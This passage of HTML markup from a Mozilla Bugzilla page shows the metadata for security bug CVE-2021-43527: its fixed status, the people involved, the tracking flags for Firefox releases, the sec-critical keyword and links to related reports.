    <div class="value">
        <span id="field-value-version">
            trunk

        </span>
    </div>

  
</div>

    <div class="field bug_modal edit-show" style="display:none"
>
    <div class="name">
      
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform" id="-help-link" class="help">Platform:
        </a>
    </div>



  
    <div class=" container"><div class="field bug_modal inline"
    id="field-rep_platform"
>



  
    <div class="value">
        <span id="field-value-rep_platform">
            All

        </span>
    </div>

  
</div><div class="field bug_modal indent inline"
    id="field-op_sys"
>



  
    <div class="value">
        <span id="field-value-op_sys">
            All

        </span>
    </div>

  
</div><div class="field bug_modal"
>



  
    <div class=" container">
    </div>

  
</div>
    </div>

  
</div>
</div><div class="fields-rhs">

    <div class="field bug_modal contains-buttons"
    id="field-bug_type"
>
    <div class="name">
      
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type" id="bug_type-help-link" class="help">Type:
        </a>
    </div>



  
    <div class="value">
        <span id="field-value-bug_type">
      <span class="bug-type-label iconic-text" data-type="defect">
        <span class="icon" aria-hidden="true"></span>defect</span>
        </span>
    </div>

  
</div>

    <div class="field bug_modal"
    id="field-importance"
>



  
    <div class=" container">
        <span id="field-value-importance"><div class="field bug_modal inline"
    id="field-priority"
>
    <div class="name">
      
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority" id="priority-help-link" class="help">Priority:
        </a>
    </div>



  
    <div class="value">
        <span id="field-value-priority">
          <em>Not set</em>
        </span>
    </div>

  
</div><div class="field bug_modal inline"
    id="field-bug_severity"
>
    <div class="name">
      
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity" id="bug_severity-help-link" class="help">Severity:
        </a>
    </div>



  
    <div class="value">
        <span id="field-value-bug_severity">
            --

        </span>
    </div>

  
</div>
        </span>
    </div>

  
</div>


    
</div>
  </div>
</section>


<section class="module" id="module-tracking"
>
    <header id="module-tracking-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Tracking section"
           data-label-collapsed="Expand Tracking section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-tracking-content"
             aria-expanded="true"
             aria-labeledby="module-tracking-title"
             aria-describedby="module-tracking-subtitle"></div>
        <h2 class="module-title" id="module-tracking-title">Tracking</h2>
          <h3 class="module-subtitle" id="module-tracking-subtitle">
            (firefox-esr78 wontfix, firefox-esr9196+ fixed, firefox93 wontfix, firefox94- wontfix, firefox95+ wontfix, firefox96+ fixed)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-tracking-content"
  ><div class="fields-lhs">

    <div class="field bug_modal edit-hide"
    id="field-status-view"
>
    <div class="name">
      
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugStatuses" id="status-view-help-link" class="help">Status:
        </a>
    </div>



  
    <div class=" container">
        <span id="field-value-status-view">RESOLVED
        FIXED
        </span>
    </div>

  
</div>

    <div class="field bug_modal edit-show"
    id="field-status-edit" style="display:none"
>
    <div class="name">
      
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugStatuses" id="status-edit-help-link" class="help">Status:
        </a>
    </div>



  
    <div class=" container">
        <span id="field-value-status-edit"><div class="field bug_modal inline"
    id="field-bug_status"
>



  
    <div class="value">
        <span id="field-value-bug_status">
            RESOLVED

        </span>
    </div>

  
</div><div class="field bug_modal indent inline"
    id="field-resolution"
>



  
    <div class="value">
        <span id="field-value-resolution">
            FIXED

        </span>
    </div>

  
</div>
  <div id="status-action-buttons">
      <div id="assigned-container" style="display:none">
        <button type="button" class="secondary" id="mark-as-assigned-btn">
          Mark as Assigned
        </button>
      </div>
  </div>
        </span>
    </div>

  
</div>

    <div class="field bug_modal"
    id="field-target_milestone"
>
    <div class="name">
      
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone" id="target_milestone-help-link" class="help">Milestone:
        </a>
    </div>



  
    <div class="value">
        <span id="field-value-target_milestone">
            3.73

        </span>
    </div>

  
</div>

    


      <div class="field bug_modal edit-show" style="display:none"
>
    <div class="name">
      
        <a href="https://wiki.mozilla.org/BMO/UserGuide#Project_Flags" id="-help-link" class="help">Project Flags:
        </a>
    </div>



  
    <div class=" container"><div class="flags edit-show" style="display:none">
  <table class="layout-table tracking-flags">
      <tr>
        <td class="tracking-flag-name">Accessibility Severity</td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_accessibility_severity-dirty">
  <select id="cf_accessibility_severity" name="cf_accessibility_severity">
        <option value="---"
          id="v6045_cf_accessibility_severity" selected
        >---
        </option>
  </select></td>
      </tr>
  </table>
</div>
    </div>

  
</div>
</div><div class="fields-rhs">

      <div class="field tracking-flags-wrapper"
>
    <div class="name">
      
        <a href="https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags" id="-help-link" class="help">Tracking Flags:
        </a>
    </div>



  
    <div class=" container"><div class="flags edit-hide">
    <table class="layout-table tracking-flags">
        <tr>
          <th></th>
          <th>Tracking</th>
          <th>Status</th>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox-esr78</td>
            <td class="tracking-flag-tracking">---
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox_esr78&amp;o1=equals&amp;v1=wontfix">wontfix</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox-esr91</td>
            <td class="tracking-flag-tracking">
                <a href="/buglist.cgi?f1=cf_tracking_firefox_esr91&amp;o1=equals&amp;v1=96%2B">96+</a>
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox_esr91&amp;o1=equals&amp;v1=fixed">fixed</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox93</td>
            <td class="tracking-flag-tracking">---
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox93&amp;o1=equals&amp;v1=wontfix">wontfix</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox94</td>
            <td class="tracking-flag-tracking">
                <a href="/buglist.cgi?f1=cf_tracking_firefox94&amp;o1=equals&amp;v1=-">-</a>
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox94&amp;o1=equals&amp;v1=wontfix">wontfix</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox95</td>
            <td class="tracking-flag-tracking">
                <a href="/buglist.cgi?f1=cf_tracking_firefox95&amp;o1=equals&amp;v1=%2B">+</a>
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox95&amp;o1=equals&amp;v1=wontfix">wontfix</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox96</td>
            <td class="tracking-flag-tracking">
                <a href="/buglist.cgi?f1=cf_tracking_firefox96&amp;o1=equals&amp;v1=%2B">+</a>
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox96&amp;o1=equals&amp;v1=fixed">fixed</a>
          </td>
        </tr>
    </table>
  </div>


<div class="flags edit-show" style="display:none">
  <table class="layout-table tracking-flags">
      <tr>
        <th></th>
        <th>Tracking</th>
        <th>Status</th>
      </tr>
      <tr>
        <td class="tracking-flag-name">relnote-firefox</td>
          <td class="tracking-flag-tracking"></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_tracking_firefox_relnote-dirty">
  <select id="cf_tracking_firefox_relnote" name="cf_tracking_firefox_relnote">
        <option value="---"
          id="v539_cf_tracking_firefox_relnote" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox-esr78</td>
          <td class="tracking-flag-tracking"></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox_esr78-dirty">
  <select id="cf_status_firefox_esr78" name="cf_status_firefox_esr78">
        <option value="wontfix"
          id="v4822_cf_status_firefox_esr78" selected
        >wontfix
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox-esr91</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox_esr91-dirty">
  <select id="cf_tracking_firefox_esr91" name="cf_tracking_firefox_esr91">
        <option value="96+"
          id="v5353_cf_tracking_firefox_esr91" selected
        >96+
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox_esr91-dirty">
  <select id="cf_status_firefox_esr91" name="cf_status_firefox_esr91">
        <option value="fixed"
          id="v5204_cf_status_firefox_esr91" selected
        >fixed
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox-esr115</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox_esr115-dirty">
  <select id="cf_tracking_firefox_esr115" name="cf_tracking_firefox_esr115">
        <option value="---"
          id="v6079_cf_tracking_firefox_esr115" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox_esr115-dirty">
  <select id="cf_status_firefox_esr115" name="cf_status_firefox_esr115">
        <option value="---"
          id="v6084_cf_status_firefox_esr115" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox-esr128</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox_esr128-dirty">
  <select id="cf_tracking_firefox_esr128" name="cf_tracking_firefox_esr128">
        <option value="---"
          id="v6501_cf_tracking_firefox_esr128" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox_esr128-dirty">
  <select id="cf_status_firefox_esr128" name="cf_status_firefox_esr128">
        <option value="---"
          id="v6505_cf_status_firefox_esr128" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox93</td>
          <td class="tracking-flag-tracking"></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox93-dirty">
  <select id="cf_status_firefox93" name="cf_status_firefox93">
        <option value="wontfix"
          id="v5277_cf_status_firefox93" selected
        >wontfix
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox94</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox94-dirty">
  <select id="cf_tracking_firefox94" name="cf_tracking_firefox94">
        <option value="-"
          id="v5287_cf_tracking_firefox94" selected
        >-
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox94-dirty">
  <select id="cf_status_firefox94" name="cf_status_firefox94">
        <option value="wontfix"
          id="v5295_cf_status_firefox94" selected
        >wontfix
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox95</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox95-dirty">
  <select id="cf_tracking_firefox95" name="cf_tracking_firefox95">
        <option value="+"
          id="v5313_cf_tracking_firefox95" selected
        >+
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox95-dirty">
  <select id="cf_status_firefox95" name="cf_status_firefox95">
        <option value="wontfix"
          id="v5322_cf_status_firefox95" selected
        >wontfix
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox96</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox96-dirty">
  <select id="cf_tracking_firefox96" name="cf_tracking_firefox96">
        <option value="+"
          id="v5340_cf_tracking_firefox96" selected
        >+
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox96-dirty">
  <select id="cf_status_firefox96" name="cf_status_firefox96">
        <option value="fixed"
          id="v5348_cf_status_firefox96" selected
        >fixed
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox134</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox134-dirty">
  <select id="cf_tracking_firefox134" name="cf_tracking_firefox134">
        <option value="---"
          id="v6773_cf_tracking_firefox134" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox134-dirty">
  <select id="cf_status_firefox134" name="cf_status_firefox134">
        <option value="---"
          id="v6778_cf_status_firefox134" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox135</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox135-dirty">
  <select id="cf_tracking_firefox135" name="cf_tracking_firefox135">
        <option value="---"
          id="v6816_cf_tracking_firefox135" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox135-dirty">
  <select id="cf_status_firefox135" name="cf_status_firefox135">
        <option value="---"
          id="v6821_cf_status_firefox135" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox136</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox136-dirty">
  <select id="cf_tracking_firefox136" name="cf_tracking_firefox136">
        <option value="---"
          id="v6838_cf_tracking_firefox136" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox136-dirty">
  <select id="cf_status_firefox136" name="cf_status_firefox136">
        <option value="---"
          id="v6843_cf_status_firefox136" selected
        >---
        </option>
  </select></td>
      </tr>
  </table>
</div>
    </div>

  
</div>

</div>
  </div>
</section>



<section class="module" id="module-people"
>
    <header id="module-people-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse People section"
           data-label-collapsed="Expand People section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-people-content"
             aria-expanded="false"
             aria-labeledby="module-people-title"
             aria-describedby="module-people-subtitle"></div>
        <h2 class="module-title" id="module-people-title">People</h2>
          <h3 class="module-subtitle" id="module-people-subtitle">
            (Reporter: taviso, Assigned: djackson)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-people-content" style="display:none"
  ><div class="fields-lhs">

    <div class="field bug_modal edit-hide"
    id="field-assigned_to"
>
    <div class="name">
      
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to" id="assigned_to-help-link" class="help">Assignee:
        </a>
    </div>



  
    <div class="value">
        <span id="field-value-assigned_to"><div class="vcard vcard_644159" ><img src="https://secure.gravatar.com/avatar/46fbd084ad1a893caecbb3d539951e40?d=mm&size=40" class="gravatar" width="20" height="20"> <a class="email " href="/user_profile?user_id=644159" > <span class="fna">djackson</span></a>
</div>
        </span>
    </div>

  
</div><div class="field bug_modal edit-show"
    id="field-assigned_to" style="display:none"
>
    <div class="name">
      
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to" id="assigned_to-help-link" class="help">Assignee:
        </a>
    </div>



  
    <div class="value">
        <span id="field-value-assigned_to">
      <div class="set-default-container" style="display:none">
        <input type="checkbox" id="set-default-assignee" name="set_default_assignee" class="set-default"
          value="1" data-for="assigned_to">
        <label for="set-default-assignee">Reset Assignee to default</label>
      </div>
        </span>
    </div>

  
</div>

    <div class="field bug_modal edit-show"
    id="field-bug_mentors" style="display:none"
>
    <div class="name">
      
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor" id="bug_mentors-help-link" class="help">Mentors:
        </a>
    </div>



  
    <div class="value">
        <span id="field-value-bug_mentors">---
        </span>
    </div>

  
</div>

    <div class="field bug_modal edit-show"
    id="field-qa_contact" style="display:none"
>
    <div class="name">
      
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact" id="qa_contact-help-link" class="help">QA Contact:
        </a>
    </div>



  
    <div class="value">
        <span id="field-value-qa_contact">
        <div class="set-default-container" style="display:none">
          <input type="checkbox" id="set-default-qa-contact" name="set_default_qa_contact" class="set-default"
            value="1" data-for="qa_contact">
          <label for="set-default-qa-contact">Reset QA Contact to default</label>
        </div>
        </span>
    </div>

  
</div>
</div><div class="fields-rhs">

    <div class="field bug_modal"
    id="field-reporter"
>
    <div class="name">
      
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter" id="reporter-help-link" class="help">Reporter:
        </a>
    </div>



  
    <div class="value">
        <span id="field-value-reporter">
            <div class="vcard vcard_592223" ><img src="https://secure.gravatar.com/avatar/27c1a60000797d8e229249290a7c7377?d=mm&size=40" class="gravatar" width="20" height="20"> <a class="email " href="/user_profile?user_id=592223" > <span class="fna">taviso</span></a>
</div>

        </span>
    </div>

  
</div>


    <div class="field bug_modal"
    id="field-triage_owner"
>
    <div class="name">
      
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner" id="triage_owner-help-link" class="help">Triage Owner:
        </a>
    </div>



  
    <div class="value">
        <span id="field-value-triage_owner">
            <div class="vcard vcard_622637" ><img src="https://secure.gravatar.com/avatar/38f561698d679a724938d4600c0f8b52?d=mm&size=40" class="gravatar" width="20" height="20"> <a class="email " href="/user_profile?user_id=622637" > <span class="fna">beurdouche</span></a>
</div>

        </span>
    </div>

  
</div>

    

    <div class="field bug_modal"
>
    <div class="name">
      
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc" id="-help-link" class="help">CC:
        </a>
    </div>



  
    <div class=" container">


        <span aria-owns="cc-summary cc-latch">
          <span role="button" tabindex="0" id="cc-summary" data-count="25">25 people
          </span>
        </span>


        <div id="cc-list" style="display:none"></div>
    </div>

  
</div>
</div>
  </div>
</section>


<section class="module" id="module-references"
>
    <header id="module-references-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse References section"
           data-label-collapsed="Expand References section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-references-content"
             aria-expanded="false"
             aria-labeledby="module-references-title"
             aria-describedby="module-references-subtitle"></div>
        <h2 class="module-title" id="module-references-title">References</h2>
      </div>
    </header>
  <div class="module-content" id="module-references-content" style="display:none"
  ><div class="fields-lhs">

    <div class="field bug_modal bug-list edit-show"
    id="field-dependson" style="display:none"
>
    <div class="name">
      
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson" id="dependson-help-link" class="help">Depends on:
        </a>
    </div>



  
    <div class="value">
        <span id="field-value-dependson">
        ---
        </span>
    </div>

  
</div><div class="field bug_modal bug-list"
    id="field-blocked"
>
    <div class="name">
      
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks" id="blocked-help-link" class="help">Blocks:
        </a>
    </div>



  
    <div class="value">
        <span id="field-value-blocked">
            <div class="bug-list">
        <span class="bug-type-label iconic" title="enhancement"
              aria-label="enhancement" data-type="enhancement">
          <span class="icon" aria-hidden="true"></span>
        </span><a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Automatic S/MIME cert import should use additional verification using mozilla::pkix"
   href="/show_bug.cgi?id=1738501">CVE-2021-43529</a>
      </div>

        </span>
    </div>

  
</div><div class="field bug_modal"
    id="field-dependencytree"
>
    <div class="name">
      
    </div>



  
    <div class=" container">
        <span id="field-value-dependencytree">
        Dependency <a href="/showdependencytree.cgi?id=1737470&amp;hide_resolved=1">tree</a>
        / <a href="/showdependencygraph.cgi?id=1737470">graph</a>
        </span>
    </div>

  
</div>

    <div class="field bug_modal bug-list edit-show"
    id="field-regresses" style="display:none"
>
    <div class="name">
      
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses" id="regresses-help-link" class="help">Regressions:
        </a>
    </div>



  
    <div class="value">
        <span id="field-value-regresses">
        ---
        </span>
    </div>

  
</div><div class="field bug_modal bug-list edit-show"
    id="field-regressed_by" style="display:none"
>
    <div class="name">
      
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by" id="regressed_by-help-link" class="help">Regressed by:
        </a>
    </div>



  
    <div class="value">
        <span id="field-value-regressed_by">
        ---
        </span>
    </div>

  
</div>

    
</div><div class="fields-rhs">

    <div class="field bug_modal edit-show"
    id="field-bug_file_loc" style="display:none"
>
    <div class="name">
      
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc" id="bug_file_loc-help-link" class="help">URL:
        </a>
    </div>



  
    <div class="value">
        <span id="field-value-bug_file_loc"><div class="link">
    <a href="" target="_blank"
      rel="noreferrer" title=""
      class="bug-url" data-safe="0"></a>
  </div>
        </span>
    </div>

  
</div>

    <div class="field bug_modal"
    id="field-see_also"
>
    <div class="name">
      
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also" id="see_also-help-link" class="help">See Also:
        </a>
    </div>



  
    <div class="value">
        <span id="field-value-see_also">
            <div class="bug-list">
        <span class="bug-type-label iconic" title="defect"
              aria-label="defect" data-type="defect">
          <span class="icon" aria-hidden="true"></span>
        </span><a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED INVALID - SEGV CERT_VerifyCertificate [vfychain]"
   href="/show_bug.cgi?id=1743881">1743881</a>
      </div>

    <div class="link">
      <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2237" title="https://bugs.chromium.org/p/project-zero/issues/detail?id=2237">bugs.chromium.org/p/project-zero/issu...</a>
    </div>

        </span>
    </div>

  
</div>
</div>
  </div>
</section>


<section class="module" id="module-details"
>
    <header id="module-details-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Details section"
           data-label-collapsed="Expand Details section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-details-content"
             aria-expanded="false"
             aria-labeledby="module-details-title"
             aria-describedby="module-details-subtitle"></div>
        <h2 class="module-title" id="module-details-title">Details</h2>
          <h3 class="module-subtitle" id="module-details-subtitle">
            (Keywords: csectype-bounds, sec-critical, Whiteboard: [disclosure deadline is 2022-01-22][sec-survey][adv-main96-][adv-ESR91.5-])
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-details-content" style="display:none"
  ><div class="fields-lhs">

    <div class="field bug_modal edit-show"
    id="field-alias" style="display:none"
>
    <div class="name">
      
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias" id="alias-help-link" class="help">Alias:
        </a>
    </div>



  
    <div class="value">
        <span id="field-value-alias">
            CVE-2021-43527

        </span>
    </div>

  
</div>

    <div class="field bug_modal"
    id="field-keywords"
>
    <div class="name">
      
        <a href="/describekeywords.cgi" id="keywords-help-link" class="help">Keywords:
        </a>
    </div>



  
    <div class="value">
        <span id="field-value-keywords">
          <a href="/buglist.cgi?keywords=csectype-bounds&amp;resolution=---">csectype-bounds</a>, 
          <a href="/buglist.cgi?keywords=sec-critical&amp;resolution=---">sec-critical</a>
        </span>
    </div>

  
</div>

    <div class="field bug_modal"
    id="field-status_whiteboard"
>
    <div class="name">
      
        <a href="https://wiki.mozilla.org/BMO/UserGuide/Whiteboard" id="status_whiteboard-help-link" class="help">Whiteboard:
        </a>
    </div>



  
    <div class="value">
        <span id="field-value-status_whiteboard">[disclosure deadline is 2022-01-22][sec-survey][adv-main96-][adv-ESR91.5-]
        </span>
    </div>

  
</div>

    <div class="field bug_modal edit-show"
    id="field-cf_has_str" style="display:none"
>
    <div class="name">
      Has STR:
    </div>



  
    <div class="value">
        <span id="field-value-cf_has_str">
            ---

        </span>
    </div>

  
</div><div class="field bug_modal edit-show"
    id="field-cf_cab_review" style="display:none"
>
    <div class="name">
      Change Request:
    </div>



  
    <div class="value">
        <span id="field-value-cf_cab_review">
            ---

        </span>
    </div>

  
</div>

    <div class="field bug_modal"
    id="field-votes"
>
    <div class="name">
      
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes" id="votes-help-link" class="help">Votes:
        </a>
    </div>



  
    <div class=" container">
        <span id="field-value-votes">0
        </span>
    </div>

  
</div>
</div><div class="fields-rhs">

    <div class="field bug_modal"
    id="field-bug_flags"
>
    <div class="name">
      Bug Flags:
    </div>



  
    <div class=" container">
        <span id="field-value-bug_flags"><div id="bug-flags" class="flags">
  <table class="layout-table">
          <tbody class="edit-hide"><tr>
    <td class="flag-setter"><div class="vcard vcard_551058" ><a class="email " href="/user_profile?user_id=551058" > <span class="fna">mboldan</span></a>
</div>
    </td>

    <td class="flag-name">
        <a href="#a4058331_551058"
            class="rel-time-title activity-ref"
            title="3 years ago"
        data-time="1639145888"
      >qe-verify</a>
    </td>

    <td class="flag-value">-
    </td>

  </tr>
          </tbody>
          <tbody class="edit-show" style="display:none"><tr>
    <td class="flag-setter"><div class="vcard vcard_551058" ><a class="email " href="/user_profile?user_id=551058" > <span class="fna">mboldan</span></a>
</div>
    </td>

    <td class="flag-name">
      <label title="qe-verify: + âžœ request to verify the bug manually
qe-verify: â€“ âžœ the bug will not/can not be verified manually" for="flag-2077149">qe-verify</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag-2077149-dirty">
      <select id="flag-2077149" name="flag-2077149"
        title="qe-verify: + âžœ request to verify the bug manually
qe-verify: â€“ âžœ the bug will not/can not be verified manually"
          disabled
        class="bug-flag">
            <option value="-" selected>-</option>
      </select>
    </td>


  </tr>
          </tbody>
    <tbody class="edit-show" style="display:none"><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Is this bug/feature enabled in a release by a pref flag?" for="flag_type-930">behind-pref</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-930-dirty">
      <select id="flag_type-930" name="flag_type-930"
        title="Is this bug/feature enabled in a release by a pref flag?"
          disabled
        class="bug-flag">
          <option value="X"></option>
      </select>
    </td>


  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Flag is used to track security bug bounty nominations. Mail security(at)mozilla.org to nominate a bug." for="flag_type-803">sec-bounty</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-803-dirty">
      <select id="flag_type-803" name="flag_type-803"
        title="Flag is used to track security bug bounty nominations. Mail security(at)mozilla.org to nominate a bug."
        class="bug-flag">
          <option value="X"></option>
            <option value="?" >?</option>
      </select>
    </td>


  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Flag is used to track whether the bug report is eligible for inclusion in the Bug Bounty Hall of Fame." for="flag_type-913">sec-bounty-hof</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-913-dirty">
      <select id="flag_type-913" name="flag_type-913"
        title="Flag is used to track whether the bug report is eligible for inclusion in the Bug Bounty Hall of Fame."
          disabled
        class="bug-flag">
          <option value="X"></option>
      </select>
    </td>


  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Whether the bug has a testcase in the qa test suite or not. Set it to &quot;in-qa-testsuite?&quot; if the bug needs a testcase (only set this if the bug actually *needs* a testcase - not all bugs do, even layout bugs!), set it to &quot;in-qa-testsuite+&quot; if the bug has an appropriate testcase, and set it to &quot;in-qa-testsuite-&quot; if the bug doesn't need an explicit testcase (e.g. for code cleanup bugs). Only QA actively working on test cases in the component should use this keyword." for="flag_type-787">in-qa-testsuite</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-787-dirty">
      <select id="flag_type-787" name="flag_type-787"
        title="Whether the bug has a testcase in the qa test suite or not. Set it to &quot;in-qa-testsuite?&quot; if the bug needs a testcase (only set this if the bug actually *needs* a testcase - not all bugs do, even layout bugs!), set it to &quot;in-qa-testsuite+&quot; if the bug has an appropriate testcase, and set it to &quot;in-qa-testsuite-&quot; if the bug doesn't need an explicit testcase (e.g. for code cleanup bugs). Only QA actively working on test cases in the component should use this keyword."
          disabled
        class="bug-flag">
          <option value="X"></option>
      </select>
    </td>

      <td class="flag-requestee">
        <div id="requestee_type-787-container" style="display:none"><input
    name="requestee_type-787"
    value="" class="requestee bz_autocomplete_user"  id="requestee_type-787" 
  >
        </div>
      <td>

  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Whether the bug has a testcase in the test suite or not. Set it to &quot;in-testsuite?&quot; if the bug needs a testcase (only set this if the bug actually *needs* a testcase - not all bugs do, even layout bugs!), set it to &quot;in-testsuite+&quot; if the bug has an appropriate testcase, and set it to &quot;in-testsuite-&quot; if the bug doesn't need an explicit testcase (e.g. for code cleanup bugs). Only QA actively working on test cases in the component should use this keyword." for="flag_type-37">in-testsuite</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-37-dirty">
      <select id="flag_type-37" name="flag_type-37"
        title="Whether the bug has a testcase in the test suite or not. Set it to &quot;in-testsuite?&quot; if the bug needs a testcase (only set this if the bug actually *needs* a testcase - not all bugs do, even layout bugs!), set it to &quot;in-testsuite+&quot; if the bug has an appropriate testcase, and set it to &quot;in-testsuite-&quot; if the bug doesn't need an explicit testcase (e.g. for code cleanup bugs). Only QA actively working on test cases in the component should use this keyword."
          disabled
        class="bug-flag">
          <option value="X"></option>
      </select>
    </td>


  </tr>
    </tbody>
  </table>
</div>
        </span>
    </div>

  
</div>
</div>

  
  </div>
</section>


<section class="module edit-show" style="display:none" id="module-crash-data"
>
    <header id="module-crash-data-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Crash Data section"
           data-label-collapsed="Expand Crash Data section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-crash-data-content"
             aria-expanded="false"
             aria-labeledby="module-crash-data-title"
             aria-describedby="module-crash-data-subtitle"></div>
        <h2 class="module-title" id="module-crash-data-title">Crash Data</h2>
      </div>
    </header>
  <div class="module-content" id="module-crash-data-content" style="display:none"
  ><div class="field bug_modal edit-show"
    id="field-cf_crash_signature" style="display:none"
>
    <div class="name">
      Signature:
    </div>



  
    <div class="value">
        <span id="field-value-cf_crash_signature">
    <em>None</em>
        </span>
    </div>

  
</div>
  </div>
</section>


<section class="module edit-show" style="display:none" id="module-security"
>
    <header id="module-security-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Security section"
           data-label-collapsed="Expand Security section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-security-content"
             aria-expanded="false"
             aria-labeledby="module-security-title"
             aria-describedby="module-security-subtitle"></div>
